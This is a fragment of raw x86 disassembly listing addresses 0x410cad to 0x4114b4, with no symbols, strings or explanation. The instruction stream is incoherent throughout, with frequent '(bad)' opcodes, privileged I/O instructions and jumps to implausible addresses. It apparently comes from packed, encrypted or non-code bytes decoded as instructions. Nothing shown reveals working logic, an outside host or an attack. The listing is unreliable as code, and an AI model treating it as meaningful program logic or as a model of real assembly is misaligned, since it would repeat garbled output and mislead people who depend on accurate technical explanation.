  410cad:	outs   dx,BYTE PTR ds:[esi]
  410cae:	cli    
  410caf:	cmp    esp,esp
  410cb1:	and    eax,0x4f641d07
  410cb6:	inc    edi
  410cb7:	xchg   ebp,eax
  410cb8:	adc    eax,0xd86509b5
  410cbd:	gs cld 
  410cbf:	out    0x12,al
  410cc1:	popa   
  410cc2:	out    dx,eax
  410cc3:	xchg   esi,eax
  410cc4:	sub    edx,DWORD PTR [edx]
  410cc6:	mov    al,ds:0x3efd3b5
  410ccb:	(bad)  
  410ccc:	fsub   QWORD PTR [eax]
  410cce:	push   esi
  410ccf:	or     al,0x71
  410cd1:	cwde   
  410cd2:	scas   eax,DWORD PTR es:[edi]
  410cd3:	adc    ecx,DWORD PTR [eax-0xb]
  410cd6:	or     al,0x9f
  410cd8:	js     0x410d52
  410cda:	cli    
  410cdb:	adc    al,0x64
  410cdd:	or     DWORD PTR [edi],edx
  410cdf:	inc    esi
  410ce0:	ds int3 
  410ce2:	sbb    DWORD PTR [eax],ebx
  410ce4:	push   ds
  410ce5:	ja     0x410cf4
  410ce7:	(bad)
  410cea:	nop
  410ceb:	inc    ebx
  410cec:	xchg   esp,eax
  410ced:	aaa    
  410cee:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  410cf0:	add    cl,al
  410cf2:	mov    fs,WORD PTR [ebx]
  410cf4:	mov    bh,0x83
  410cf6:	mov    dl,BYTE PTR [eax+0x46]
  410cf9:	xlat   BYTE PTR ds:[ebx]
  410cfa:	xor    eax,0xa534ab9
  410cff:	or     ah,BYTE PTR [ecx+0x28d388af]
  410d05:	ror    ch,1
  410d07:	rcl    DWORD PTR [ecx+0x7b],1
  410d0a:	mov    eax,0x81f06196
  410d0f:	inc    esi
  410d10:	xor    al,0x35
  410d12:	scas   al,BYTE PTR es:[edi]
  410d13:	in     al,0x92
  410d15:	fs data16 aad 0xc3
  410d19:	push   ss
  410d1a:	test   al,0x8c
  410d1c:	fcom   QWORD PTR [ecx-0x2250a904]
  410d22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d23:	pop    es
  410d24:	iret   
  410d25:	or     al,0x70
  410d27:	scas   al,BYTE PTR es:[edi]
  410d28:	aad    0x1d
  410d2a:	clc    
  410d2b:	les    ebx,FWORD PTR [ecx-0x2d79676f]
  410d31:	inc    edi
  410d32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d33:	adc    BYTE PTR [esi-0x7a01a96d],dh
  410d39:	inc    ebx
  410d3a:	mov    esp,0x97916134
  410d40:	ins    DWORD PTR es:[edi],dx
  410d41:	(bad)  
  410d42:	call   0xd0bf:0x22c25af6
  410d49:	mov    bl,al
  410d4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d4c:	cmp    esi,ecx
  410d4e:	or     DWORD PTR [ebx],edi
  410d50:	pop    edi
  410d51:	aas    
  410d52:	retf   
  410d53:	push   es
  410d54:	mov    al,0x25
  410d56:	je     0x410dcd
  410d58:	aad    0xa0
  410d5a:	mov    ch,0x5f
  410d5c:	mov    esp,0x12e9007a
  410d61:	jmp    0x410d21
  410d63:	jb     0x410cfc
  410d65:	dec    eax
  410d66:	xor    al,0x7c
  410d68:	ret    0x45fb
  410d6b:	jno    0x410d30
  410d6d:	aas    
  410d6e:	sbb    ebx,0xa6b5f259
  410d74:	mov    ecx,0xec9f343b
  410d7a:	pop    es
  410d7b:	xchg   esi,eax
  410d7c:	mov    eax,0x2f0016f
  410d82:	cmc    
  410d83:	lock cmp DWORD PTR [esi],edi
  410d86:	retf   
  410d87:	shl    BYTE PTR [edx+edi*2-0x19],cl
  410d8b:	sub    al,BYTE PTR [eax]
  410d8d:	sti    
  410d8e:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  410d90:	fnstcw WORD PTR [ecx-0x22]
  410d93:	dec    edx
  410d94:	les    ebp,FWORD PTR [eax+0x12]
  410d97:	test   BYTE PTR [ecx+esi*2],0x7b
  410d9b:	and    BYTE PTR [ecx+0x4f],dl
  410d9e:	ins    DWORD PTR es:[edi],dx
  410d9f:	bnd js 0x410dda
  410da2:	push   edi
  410da3:	mov    al,0xd3
  410da5:	adc    DWORD PTR [edi],edx
  410da7:	in     eax,dx
  410da8:	sbb    BYTE PTR [ebx+0x203f4cda],bh
  410dae:	inc    edi
  410daf:	xlat   BYTE PTR ds:[ebx]
  410db0:	fs sti 
  410db2:	add    esp,DWORD PTR [ecx-0x2bbd5f6f]
  410db8:	les    eax,FWORD PTR [edi+0x60402b3b]
  410dbe:	fild   QWORD PTR [ebp+edi*2-0x5]
  410dc2:	fidiv  DWORD PTR [edi+ebx*1]
  410dc5:	lock test ebp,edi
  410dc8:	out    0x8b,al
  410dca:	jmp    0xf2cdb8ce
  410dcf:	add    eax,0x528cd20e
  410dd4:	xor    BYTE PTR [edi-0x9],cl
  410dd7:	adc    al,0x4c
  410dd9:	loope  0x410dde
  410ddb:	adc    al,0xb8
  410ddd:	mov    al,ch
  410ddf:	enter  0x956b,0x4e
  410de3:	add    eax,0x353a7485
  410de8:	adc    BYTE PTR [esi],dl
  410dea:	hlt    
  410deb:	in     al,dx
  410dec:	xchg   BYTE PTR [esi-0x5b],ah
  410def:	cwde   
  410df0:	mov    eax,0x43201375
  410df5:	in     al,dx
  410df6:	jmp    0xbc9222f
  410dfb:	loop   0x410de2
  410dfd:	add    al,BYTE PTR [eax-0x12]
  410e00:	adc    BYTE PTR [esp+eax*2],bh
  410e03:	xor    al,0xe1
  410e05:	mov    ebx,0x1f8593b5
  410e0a:	in     al,dx
  410e0b:	ja     0x410dfa
  410e0d:	gs stc 
  410e0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e10:	cmp    ecx,0x0
  410e13:	neg    DWORD PTR [edx-0x7]
  410e16:	(bad)
  410e19:	arpl   WORD PTR [ebx],cx
  410e1b:	mov    ebp,0x65443980
  410e20:	imul   esp,esp,0xffffff9c
  410e23:	mov    dl,0x4a
  410e25:	fwait
  410e26:	scas   al,BYTE PTR es:[edi]
  410e27:	jmp    0x410e70
  410e29:	adc    al,0x86
  410e2b:	and    al,0x38
  410e2d:	mov    eax,ds:0xd53ff6f3
  410e32:	mov    dl,cl
  410e34:	mov    ebx,0x8c753b74
  410e39:	jmp    0x9b9f39d4
  410e3e:	xchg   edi,eax
  410e3f:	arpl   WORD PTR [edx+ecx*4-0x49],di
  410e43:	les    esi,FWORD PTR [ebp-0x3c]
  410e46:	push   ds
  410e47:	mov    al,ds:0xb389fb2b
  410e4c:	(bad)  
  410e4e:	int    0x20
  410e50:	jnp    0x410e9d
  410e52:	cmp    dh,ah
  410e54:	sar    DWORD PTR [edx+0x7a2738bc],cl
  410e5a:	or     eax,0x10051848
  410e5f:	scas   al,BYTE PTR es:[edi]
  410e60:	(bad)
  410e63:	mov    eax,ds:0x2de35f65
  410e68:	sbb    al,0x79
  410e6a:	push   ss
  410e6b:	sbb    BYTE PTR [eax+0x7f],al
  410e6e:	xor    DWORD PTR [eax-0x13e0fef],esp
  410e74:	arpl   WORD PTR [edi+eax*2+0x2d11c197],di
  410e7b:	or     ch,BYTE PTR [edi+0x13ae6c05]
  410e81:	(bad)  
  410e83:	aam    0xe2
  410e85:	cwde   
  410e86:	mov    dl,0xb3
  410e88:	mov    esp,0x2d7e57db
  410e8d:	out    dx,eax
  410e8e:	fmulp  st(2),st
  410e90:	repz push esi
  410e92:	add    al,0xf5
  410e94:	aas    
  410e95:	mov    ebp,fs
  410e97:	int3   
  410e98:	out    dx,eax
  410e99:	out    dx,eax
  410e9a:	pop    ebx
  410e9b:	call   0xcf7430b0
  410ea0:	jge    0x410e9a
  410ea2:	repnz mov ds:0x4019ab1,al
  410ea8:	xlat   BYTE PTR ds:[ebx]
  410ea9:	jecxz  0x410e5e
  410eab:	push   ss
  410eac:	sbb    eax,DWORD PTR [edi]
  410eae:	jp     0x410e99
  410eb0:	jne    0x410e64
  410eb2:	adc    ch,0x3a
  410eb5:	push   cs
  410eb6:	mov    ebp,0xb92e8bcd
  410ebb:	cld    
  410ebc:	push   0x7e
  410ebe:	xor    al,BYTE PTR [esi]
  410ec0:	cli    
  410ec1:	cld    
  410ec2:	(bad)  
  410ec3:	and    eax,0x606bf4b8
  410ec8:	inc    ebp
  410ec9:	retf   0x806b
  410ecc:	iret   
  410ecd:	push   0xf6cdaed7
  410ed2:	sub    eax,0x579e792b
  410ed7:	data16 daa 
  410ed9:	in     eax,0xe3
  410edb:	push   ebp
  410edc:	sub    al,BYTE PTR [edx+0x24]
  410edf:	aad    0xe5
  410ee1:	test   eax,0x9629cfe
  410ee6:	out    dx,al
  410ee7:	mov    dl,0x28
  410ee9:	dec    esi
  410eea:	(bad)  
  410eeb:	in     al,dx
  410eec:	pop    ebx
  410eed:	cmp    eax,0x98048592
  410ef2:	pop    eax
  410ef3:	mov    edi,0xfff6bc11
  410ef8:	test   BYTE PTR fs:[ecx],cl
  410efb:	push   es
  410efc:	push   ss
  410efd:	jg     0x410ea6
  410eff:	out    0x1f,al
  410f01:	loop   0x410efb
  410f03:	jmp    0xe29f7c83
  410f08:	mov    ebp,0xf51d77f0
  410f0d:	mov    eax,0x8ae1e471
  410f12:	ret    
  410f13:	jbe    0x410f22
  410f15:	sbb    eax,0xc64c58da
  410f1a:	or     bh,cl
  410f1c:	inc    esp
  410f1d:	add    eax,0xe64e30e1
  410f22:	and    al,bh
  410f24:	add    edx,DWORD PTR [ebp+0xb]
  410f27:	mov    edi,0xbb463c05
  410f2c:	rcl    al,1
  410f2e:	(bad)  
  410f2f:	leave  
  410f30:	mov    dl,0x80
  410f32:	jns    0x410f7f
  410f34:	add    eax,0x7b802a54
  410f39:	or     eax,DWORD PTR [edi+0x6fe219ad]
  410f3f:	sub    ch,BYTE PTR [edi+0x45c2e2b6]
  410f45:	pop    ebx
  410f46:	pop    esi
  410f47:	push   ss
  410f48:	inc    ecx
  410f49:	test   BYTE PTR [edx],ch
  410f4b:	inc    BYTE PTR [eax-0x7093e0c3]
  410f51:	push   ecx
  410f52:	lods   eax,DWORD PTR ds:[esi]
  410f53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f54:	xor    BYTE PTR [ecx-0x13],bh
  410f57:	fwait
  410f58:	and    DWORD PTR [edi+0x2],ecx
  410f5b:	push   0xffffffc1
  410f5d:	sub    esi,ebp
  410f5f:	xor    al,0x63
  410f61:	mov    eax,0x967e20a9
  410f66:	ja     0x410f4f
  410f68:	sub    eax,0x23fb91c6
  410f6d:	addr16 (bad) 
  410f71:	mov    ebp,0x3c2eba6d
  410f76:	es push es
  410f78:	sub    DWORD PTR [eax-0x14],eax
  410f7b:	xor    BYTE PTR [ebp+0x75c85ff5],bl
  410f81:	mul    BYTE PTR [edx+edx*1]
  410f84:	(bad)  
  410f85:	in     al,dx
  410f86:	into   
  410f87:	test   DWORD PTR [ebx+0x34],ecx
  410f8a:	mov    al,0xe4
  410f8c:	fadd   st,st(1)
  410f8e:	pop    esi
  410f8f:	jp     0x410f7d
  410f91:	and    eax,edi
  410f93:	in     al,0x80
  410f95:	leave  
  410f96:	adc    eax,0x5a82dd82
  410f9b:	dec    ebp
  410f9c:	cmp    ecx,ecx
  410f9e:	popf   
  410f9f:	out    0xda,eax
  410fa1:	pop    eax
  410fa2:	push   ss
  410fa3:	je     0x410fd7
  410fa5:	sbb    cl,BYTE PTR [eax+edi*2+0x75479ddb]
  410fac:	aaa    
  410fad:	loop   0x41100a
  410faf:	mov    eax,0xac578634
  410fb4:	sahf   
  410fb5:	and    al,0x1
  410fb7:	jg     0x411009
  410fb9:	mov    gs,WORD PTR [eax-0x2fadf335]
  410fbf:	mov    bh,0xc2
  410fc1:	ss mov ecx,0x8e8261a7
  410fc7:	jle    0x410f58
  410fc9:	fisttp WORD PTR [esi+eax*8]
  410fcc:	inc    ecx
  410fcd:	fcmovne st,st(6)
  410fcf:	iret   
  410fd0:	(bad)  
  410fd1:	loopne 0x411043
  410fd3:	(bad)  
  410fd5:	not    DWORD PTR [esi-0x38]
  410fd8:	adc    eax,0xc293466d
  410fdd:	sbb    eax,0xd4994d7c
  410fe2:	jp     0x410f7c
  410fe4:	cmp    al,bh
  410fe6:	psubsb mm1,QWORD PTR [si-0x7bf7]
  410fec:	fdivr  DWORD PTR [edx-0x64]
  410fef:	dec    edx
  410ff0:	mov    esi,0x78831717
  410ff5:	fdivr  st(3),st
  410ff7:	xor    eax,0x9c2cce1b
  410ffc:	mov    edi,0xb401625d
  411001:	loop   0x410fef
  411003:	sar    BYTE PTR [ecx-0x23],0x30
  411007:	loope  0x410fed
  411009:	imul   esp,eax,0x12
  41100c:	leave  
  41100d:	sub    ecx,DWORD PTR [edi+0x58]
  411010:	dec    esp
  411011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411012:	daa    
  411013:	js     0x411089
  411015:	aaa    
  411016:	cdq    
  411017:	jl     0x410fd0
  411019:	mov    es,WORD PTR [edx]
  41101b:	lea    ecx,ds:0x29b06b96
  411021:	cmc    
  411022:	xchg   ecx,eax
  411023:	enter  0xa5ca,0x4c
  411027:	pop    ds
  411028:	mov    bh,0xfe
  41102a:	inc    edx
  41102b:	cmp    ecx,ebp
  41102d:	adc    DWORD PTR [esi+0x76df2924],esi
  411033:	sbb    esi,eax
  411035:	clc    
  411036:	sub    al,0x5b
  411038:	and    al,al
  41103a:	jbe    0x4110a3
  41103c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41103d:	lock (bad) 
  41103f:	sahf   
  411040:	into   
  411041:	dec    edx
  411042:	mov    ds,WORD PTR [ecx-0x37]
  411045:	outs   dx,DWORD PTR ds:[esi]
  411046:	xchg   ebx,eax
  411047:	mov    al,0x60
  411049:	rol    BYTE PTR [edx+0x12],0x61
  41104d:	cmp    eax,0xb5e499a7
  411052:	aas    
  411053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411054:	nop    DWORD PTR [eax+eax*1]
  411058:	nop
  411059:	sahf   
  41105a:	cmp    eax,0x32256955
  41105f:	add    al,BYTE PTR [esi]
  411061:	jg     0x410ff2
  411063:	jnp    0x411025
  411065:	push   cs
  411066:	push   cs
  411067:	sub    cl,al
  411069:	mov    eax,0x237fcd41
  41106e:	dec    eax
  41106f:	sub    al,0x9c
  411071:	pop    edi
  411072:	jae    0x4110bf
  411074:	sbb    esp,ebx
  411076:	dec    ecx
  411077:	push   ds
  411078:	dec    esi
  411079:	mov    al,ds:0x99655771
  41107e:	adc    al,0x6f
  411080:	stc    
  411081:	cwde   
  411082:	rcr    BYTE PTR [ebp+0x78],0x35
  411086:	mov    ecx,0xb2deeb36
  41108b:	xor    al,0x34
  41108d:	loop   0x411086
  41108f:	fs retf 
  411091:	(bad)  
  411092:	xor    al,0x56
  411094:	fstp   QWORD PTR [ebx-0x57]
  411097:	sahf   
  411098:	inc    ebp
  411099:	in     al,0xfb
  41109b:	mov    edi,0xbb0bb6c5
  4110a0:	into   
  4110a1:	imul   ecx,DWORD PTR [ecx],0x89f204f2
  4110a7:	jp     0x411038
  4110a9:	jo     0x411090
  4110ab:	push   es
  4110ac:	sbb    eax,0x88540da
  4110b1:	mov    ecx,0xc42aa28c
  4110b6:	xor    edi,ebx
  4110b8:	and    DWORD PTR [ecx+0x4eee562a],0x38
  4110bf:	ds into 
  4110c1:	dec    esp
  4110c2:	or     bh,BYTE PTR [eax-0x4c]
  4110c5:	ret    0xafc2
  4110c8:	xchg   BYTE PTR [ebp+0x49],al
  4110cb:	mov    bl,BYTE PTR [edi-0x26]
  4110ce:	xchg   esi,eax
  4110cf:	and    BYTE PTR [eax+0x2daa14cf],bl
  4110d5:	sbb    eax,0xfd29ce23
  4110da:	aad    0x15
  4110dc:	pop    edi
  4110dd:	push   0x13
  4110df:	mov    al,ds:0xc26eb962
  4110e4:	pop    eax
  4110e5:	rcr    DWORD PTR [eax+0x3d61c171],cl
  4110eb:	jp     0x4110ee
  4110ed:	mov    ecx,0x770c75ff
  4110f2:	(bad)  
  4110f3:	call   0x97c0c5dc
  4110f8:	les    ebp,FWORD PTR [ebx]
  4110fa:	test   eax,0x52b3702e
  4110ff:	push   esp
  411100:	sub    BYTE PTR [edi-0x3b],dl
  411103:	lods   al,BYTE PTR ds:[esi]
  411104:	idiv   DWORD PTR [ebp-0x37eccb4e]
  41110a:	sti    
  41110b:	shl    DWORD PTR [eax+0x9],0xaf
  41110f:	retf   0x3431
  411112:	push   0xffffffe0
  411114:	push   0xfffffff3
  411116:	mov    dl,0x72
  411118:	adc    dl,BYTE PTR [ecx]
  41111a:	xor    eax,0x1691fbe1
  41111f:	mov    edx,0xdc1e4717
  411124:	repnz shr BYTE PTR [ebx+0x6180b17e],1
  41112b:	xor    al,0x8
  41112d:	and    dl,BYTE PTR [ebx+0xd01f78b]
  411133:	xchg   esp,eax
  411134:	lahf   
  411135:	cli    
  411136:	repnz cmp al,0xff
  411139:	cdq    
  41113a:	cmp    BYTE PTR [esi],dh
  41113c:	mov    WORD PTR [ebp-0x13],?
  41113f:	rcl    DWORD PTR [edx-0x2],cl
  411142:	in     eax,0xeb
  411144:	pop    ebx
  411145:	or     BYTE PTR [edx-0x3],bh
  411148:	mov    edi,0x58d57304
  41114d:	dec    edx
  41114e:	pop    edi
  41114f:	mov    ds:0x39edc697,eax
  411154:	adc    DWORD PTR [esi],esi
  411156:	jmp    0x281:0x7ce3c593
  41115d:	mov    ah,0xee
  41115f:	mov    ebp,0x3ef2fd46
  411164:	mov    bh,0x7c
  411166:	add    eax,0x43efe66b
  41116b:	fwait
  41116c:	add    BYTE PTR [esi+0x16],bl
  41116f:	pop    eax
  411170:	xchg   esp,eax
  411171:	cmc    
  411172:	xchg   BYTE PTR [esi-0x4b8c1554],cl
  411178:	sbb    BYTE PTR [ebx+0x3b5e0f37],ah
  41117e:	cmp    ch,BYTE PTR [ebp-0x6d604a27]
  411184:	adc    ecx,ebx
  411186:	push   ebp
  411187:	inc    edx
  411188:	gs test eax,0xda8da2b9
  41118e:	push   ebx
  41118f:	jecxz  0x41117b
  411191:	xchg   ecx,eax
  411192:	inc    DWORD PTR [ecx+edi*1-0xf247843]
  411199:	cmc    
  41119a:	pop    ebx
  41119b:	int3   
  41119c:	add    BYTE PTR [edi+eax*8],al
  41119f:	pop    ss
  4111a0:	ss loopne 0x41119c
  4111a3:	mov    ds:0xdfac90e4,al
  4111a8:	push   cs
  4111a9:	test   al,0x45
  4111ab:	repz leave 
  4111ad:	mov    edi,0x8b7028bd
  4111b2:	mov    ebp,0x70c115f6
  4111b8:	aad    0x3a
  4111ba:	add    DWORD PTR [eax-0x4e7f4e53],edi
  4111c0:	push   ss
  4111c1:	add    esi,DWORD PTR [edi+0x0]
  4111c4:	inc    ecx
  4111c5:	adc    BYTE PTR ss:[esi],al
  4111c8:	pop    esi
  4111c9:	xor    al,0x68
  4111cb:	int3   
  4111cc:	rol    DWORD PTR [esi+ecx*1-0x2f],1
  4111d0:	loope  0x4111a3
  4111d2:	retf   
  4111d3:	pusha  
  4111d4:	call   0x573114be
  4111d9:	fwait
  4111da:	mov    ah,0xe7
  4111dc:	mov    ds:0xd1bfa16d,eax
  4111e1:	pusha  
  4111e2:	call   FWORD PTR [ebx-0x75bb030b]
  4111e8:	mov    bh,0x2d
  4111ea:	adc    eax,0x27
  4111ed:	ds mov esp,0xb32e060f
  4111f3:	mov    edi,0x66b5b12b
  4111f8:	mov    eax,ds:0xf71f8383
  4111fd:	out    0xdc,al
  4111ff:	aas    
  411200:	in     eax,0x6d
  411202:	ret    
  411203:	fwait
  411204:	adc    al,0x8e
  411206:	fisubr WORD PTR [ebx-0x7ff2c0de]
  41120c:	int    0xa7
  41120e:	adc    BYTE PTR [edx+0x4c2eb7df],dl
  411214:	test   BYTE PTR [eax-0x1c06a90],cl
  41121a:	push   ebp
  41121b:	ss call 0x98c866e9
  411221:	fmul   QWORD PTR [ebp-0x8]
  411224:	and    bl,BYTE PTR [eax-0x4b]
  411227:	jmp    0x411223
  411229:	scas   eax,DWORD PTR es:[edi]
  41122a:	lea    eax,[esi+0x671955d2]
  411230:	push   0x7c0651f5
  411235:	loop   0x4111e5
  411237:	xor    DWORD PTR [esi+0x55],ebp
  41123a:	add    DWORD PTR [esi-0x39],ebp
  41123d:	aaa    
  41123e:	and    BYTE PTR ds:0x8d15f5f2,0x8b
  411245:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411246:	loope  0x411235
  411248:	shr    DWORD PTR [esi-0x16],1
  41124b:	lea    ebx,[ebx+0x60efe327]
  411251:	ss faddp st(4),st
  411254:	sahf   
  411255:	add    dl,BYTE PTR [edx+esi*1]
  411258:	push   ecx
  411259:	rcr    BYTE PTR [edi],cl
  41125b:	pop    ebx
  41125c:	lods   al,BYTE PTR ds:[esi]
  41125d:	int    0x55
  41125f:	sbb    BYTE PTR [eax+ebx*2],0x25
  411263:	cs pop ebx
  411265:	into   
  411266:	or     edx,DWORD PTR [ecx+0x60a7d2d9]
  41126c:	fmul   st(2),st
  41126e:	dec    esp
  41126f:	inc    ebx
  411270:	xor    DWORD PTR [ebx*2-0x66c5e58a],ecx
  411277:	ja     0x41121f
  411279:	jle    0x411250
  41127b:	(bad)  
  41127c:	xor    esp,DWORD PTR [ebp+0x66033d2b]
  411282:	(bad)  
  411283:	ror    DWORD PTR [edi+0x7b052481],1
  411289:	xchg   ebp,eax
  41128a:	pop    ebx
  41128b:	add    eax,0x30b92a0a
  411290:	jg     0x41127f
  411292:	test   BYTE PTR [eax+0x36],ah
  411295:	imul   esi,esp,0x4df31e4e
  41129b:	xor    cl,BYTE PTR [ebx+ebx*1-0x78474eec]
  4112a2:	fldcw  WORD PTR [eax+0x468341ed]
  4112a8:	and    DWORD PTR [edx],edi
  4112aa:	inc    eax
  4112ab:	pusha  
  4112ac:	inc    ebx
  4112ad:	gs mov ecx,0xae01966e
  4112b3:	aam    0x28
  4112b5:	add    ebx,ebp
  4112b7:	lds    ecx,FWORD PTR [ecx-0x3c12f5d3]
  4112bd:	mov    ebx,0x41c95450
  4112c2:	sub    al,0xcd
  4112c4:	sub    dh,0xf0
  4112c7:	fld    TBYTE PTR [edx]
  4112c9:	out    dx,al
  4112ca:	add    al,0xab
  4112cc:	dec    ecx
  4112cd:	popf   
  4112ce:	retf   
  4112cf:	scas   eax,DWORD PTR es:[edi]
  4112d0:	jmp    0x5a4f:0x3679e671
  4112d7:	mov    ebp,esp
  4112d9:	es ret 
  4112db:	mov    al,0xfb
  4112dd:	sbb    bh,dl
  4112df:	leave  
  4112e0:	js     0x411347
  4112e2:	pop    ecx
  4112e3:	push   esi
  4112e4:	pop    ebx
  4112e5:	pop    es
  4112e6:	aaa    
  4112e7:	pop    ebp
  4112e8:	fbstp  TBYTE PTR [esi]
  4112ea:	xchg   edx,eax
  4112eb:	add    al,0x9
  4112ed:	mov    ebx,DWORD PTR [eax+eiz*8+0x11]
  4112f1:	out    0xe0,eax
  4112f3:	sub    al,dh
  4112f5:	dec    ebx
  4112f6:	add    al,0x4e
  4112f8:	ret    0x7b30
  4112fb:	mov    edx,0x85b8b52a
  411300:	sbb    dl,BYTE PTR [ecx]
  411302:	adc    al,BYTE PTR [ebx-0x214d7975]
  411308:	inc    esp
  411309:	inc    ebp
  41130a:	xor    al,0xc2
  41130c:	push   ebp
  41130d:	xchg   bx,ax
  41130f:	adc    dl,BYTE PTR [edx+0x53]
  411312:	in     al,0x36
  411314:	loop   0x4112e8
  411316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411317:	mov    ebp,cs
  411319:	test   al,0xef
  41131b:	inc    esi
  41131c:	daa    
  41131d:	stos   DWORD PTR es:[edi],eax
  41131e:	jne    0x41138a
  411320:	pop    ss
  411321:	lds    eax,FWORD PTR [edi]
  411323:	jge    0x4112e3
  411325:	pop    edx
  411326:	ins    DWORD PTR es:[edi],dx
  411327:	ret    
  411328:	stc    
  411329:	jne    0x411381
  41132b:	adc    al,0x8c
  41132d:	std    
  41132e:	adc    esi,eax
  411330:	les    ebp,FWORD PTR ss:[edi-0x33]
  411334:	mov    bh,0x34
  411336:	(bad)  
  411337:	std    
  411338:	cmp    esi,esp
  41133a:	add    DWORD PTR [ebx],esi
  41133c:	cmp    DWORD PTR [eax+0x5700b822],0x42
  411343:	inc    edi
  411344:	sub    al,0xc
  411346:	mov    dl,0xa
  411348:	sahf   
  411349:	xchg   ebp,eax
  41134a:	iret   
  41134b:	inc    edi
  41134c:	scas   eax,DWORD PTR es:[edi]
  41134d:	xchg   ebx,eax
  41134e:	lock jp 0x4112de
  411351:	inc    eax
  411352:	cwde   
  411353:	pop    ebx
  411355:	lds    ebp,FWORD PTR [edi+0x3c9e5a8b]
  41135b:	retf   0xc2ae
  41135e:	pop    ds
  41135f:	jg     0x41139a
  411361:	jl     0x4113b6
  411363:	repnz sub esp,DWORD PTR [ebp+0x63f018b6]
  41136a:	mov    dl,0x4
  41136c:	adc    eax,0x401b90cf
  411371:	lock mov esp,0xb4067831
  411377:	(bad)  
  411378:	cmp    eax,0x2f998ebb
  41137d:	pop    ss
  41137e:	out    0x92,al
  411380:	inc    ebx
  411381:	mov    al,ds:0x71194bde
  411386:	add    eax,0xc81a7e5f
  41138b:	icebp  
  41138c:	inc    esp
  41138d:	je     0x411320
  41138f:	sbb    eax,0xc97194d7
  411394:	jmp    0x411346
  411396:	fisttp DWORD PTR [edi]
  411398:	fnstsw WORD PTR [edi+0xa]
  41139b:	xchg   esp,eax
  41139c:	mov    DWORD PTR [esi+0x286fc4b7],edx
  4113a2:	daa    
  4113a3:	shr    edi,cl
  4113a5:	sti    
  4113a6:	out    dx,eax
  4113a7:	adc    ch,BYTE PTR [esi-0x6349ced7]
  4113ad:	retf   0xd6ce
  4113b0:	into   
  4113b1:	retf   0x59b6
  4113b4:	dec    ecx
  4113b5:	xchg   esp,eax
  4113b6:	pushf  
  4113b7:	cmp    al,0xce
  4113b9:	(bad)  
  4113ba:	push   0xffffffc2
  4113bc:	daa    
  4113bd:	fsub   st(2),st
  4113bf:	pop    esi
  4113c0:	(bad)  
  4113c1:	loop   0x4113d8
  4113c3:	pushf  
  4113c4:	cmp    esi,DWORD PTR [ecx-0x5d03e75f]
  4113ca:	popf   
  4113cb:	mov    ah,0x50
  4113cd:	retf   
  4113ce:	push   cs
  4113cf:	dec    edx
  4113d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113d1:	daa    
  4113d2:	jne    0x4113ee
  4113d4:	test   DWORD PTR [esi],esi
  4113d6:	jne    0x41144d
  4113d8:	inc    edx
  4113d9:	repz cmp esi,eax
  4113dc:	xor    edi,DWORD PTR [edi+eiz*4+0x52]
  4113e0:	fdiv   DWORD PTR [edi+0x19f4851e]
  4113e6:	xchg   esp,eax
  4113e7:	rcr    DWORD PTR [eax],1
  4113e9:	jb     0x411425
  4113eb:	add    eax,0xbf38bdce
  4113f0:	ds inc ecx
  4113f2:	jl     0x41140e
  4113f4:	imul   edi,DWORD PTR [ebp+ebx*8+0x3f],0x73
  4113f9:	xor    BYTE PTR [esi+0x32357404],dh
  4113ff:	dec    esi
  411400:	pop    esi
  411401:	xor    ch,BYTE PTR [edx]
  411403:	xchg   edx,eax
  411404:	inc    edi
  411405:	jnp    0x4113e8
  411407:	(bad)  
  411408:	xchg   ebp,eax
  411409:	dec    edi
  41140a:	loope  0x411430
  41140c:	icebp  
  41140d:	hlt    
  41140e:	add    DWORD PTR [ebx-0x49544b43],esp
  411414:	ret    0xb3fc
  411417:	lahf   
  411418:	push   ebx
  411419:	retf   
  41141a:	into   
  41141b:	xor    dh,ch
  41141d:	js     0x41140d
  41141f:	xor    eax,0x90d04354
  411424:	add    eax,0x50f9142e
  411429:	test   ebp,esp
  41142b:	lods   al,BYTE PTR ds:[esi]
  41142c:	sbb    ebx,edx
  41142e:	nop
  41142f:	jns    0x41148d
  411431:	aas    
  411432:	mov    ds:0xf981571f,al
  411437:	mov    ch,0x73
  411439:	jg     0x4114ad
  41143b:	aaa    
  41143c:	stos   BYTE PTR es:[edi],al
  41143d:	add    bl,BYTE PTR [ebx+eiz*1+0x46]
  411441:	xchg   BYTE PTR [esi-0x55],ch
  411444:	ret    0xc337
  411447:	mov    esp,0x9211672a
  41144c:	sar    ecx,cl
  41144e:	mov    ecx,0xec5ea31e
  411453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411454:	inc    esi
  411455:	lock sbb DWORD PTR [edx],edx
  411458:	jmp    0xbaf79b73
  41145d:	adc    eax,0xfaa22f5
  411462:	outs   dx,BYTE PTR ds:[esi]
  411463:	jae    0x4114ae
  411465:	sub    edi,ecx
  411467:	mov    bh,0xca
  411469:	in     eax,dx
  41146a:	sbb    ah,BYTE PTR [edi+0x7718ce1d]
  411470:	cld    
  411471:	xchg   ebx,eax
  411472:	push   ds
  411473:	sbb    DWORD PTR [esi-0x4b],esi
  411476:	retf   0xc7fe
  411479:	ret    0x5d46
  41147c:	inc    BYTE PTR [eax-0x25195515]
  411482:	pop    ds
  411483:	cmp    BYTE PTR [ebx-0x6da20a2c],dh
  411489:	(bad)  
  41148a:	fwait
  41148b:	stc    
  41148c:	idiv   DWORD PTR [edx+0x31c0ebf9]
  411492:	addr16 inc esp
  411494:	loopne 0x41150a
  411496:	jae    0x41145a
  411498:	test   DWORD PTR [eax-0x55b4caf9],esp
  41149e:	mov    edi,0x27798b7b
  4114a3:	stc    
  4114a4:	hlt    
  4114a5:	adc    ecx,DWORD PTR [esi+0x18]
  4114a8:	enter  0x90d1,0x95
  4114ac:	and    BYTE PTR cs:[ecx],dh
  4114af:	and    eax,0xabb6c4c1
  4114b4:	mov    ah,0xd6
